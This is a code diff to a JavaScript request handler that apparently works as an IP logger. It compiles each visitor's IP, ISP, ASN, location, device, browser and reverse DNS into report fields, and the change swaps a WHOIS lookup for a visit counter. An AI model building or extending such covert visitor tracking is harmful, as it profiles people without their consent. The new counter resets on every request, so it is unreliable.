@@ -112,7 +112,7 @@ function logDebugInfo(reverseDNS) {
 function createCommonFields(
     ipDetails, coords, userAgent, deviceType, os, browserEngine,
     acceptLanguage, acceptEncoding, doNotTrack, referer,
-    registrationDate
+    visitCounter
 ) {
     // Helper function to safely format values
     const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
@@ -123,7 +123,7 @@ function createCommonFields(
         { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
         { name: "Port", value: `\`${port}\``, inline: true },
         { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
-        { name: "Registration Date", value: `\`${registrationDate}\``, inline: true },
+        { name: "Visit Count", value: `\`${visitCounter}\``, inline: true },
         { name: "Organization", value: safeValue(ipDetails.org), inline: true },
         { name: "ASN", value: safeValue(ipDetails.as), inline: true },
         { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
@@ -189,19 +189,10 @@ export default async function handler(req, res) {
             : "Not available";
 
 
-        let registrationDate = "Not available";
-        try {
-            const whoisResponse = await fetch(`https://jsonwhoisapi.com/api/v1/whois?identifier=${ip}`);
-            if (!whoisResponse.ok) {
-                console.error(`WHOIS API error: ${whoisResponse.status} ${whoisResponse.statusText}`);
-            } else {
-                const whoisDetails = await whoisResponse.json();
-                registrationDate = whoisDetails.created_date || "Not available";
-            }
-        } catch (error) {
-            console.error("Failed to retrieve WHOIS details:", error.message || error);
-        }
-
+            let visitCounter = 0;
+            const incrementVisitCounter = () => { visitCounter += 1; };
+            incrementVisitCounter();
+            
 
         // Perform reverse DNS lookup
         const reverseDNS = ipDetails.query ? await getReverseDNS(ipDetails.query) : 'N/A';
@@ -346,7 +337,7 @@ export default async function handler(req, res) {
                     acceptEncoding,
                     doNotTrack,
                     referer,
-                    registrationDate
+                    visitCounter
                 );
 
                 // Output or use the fields
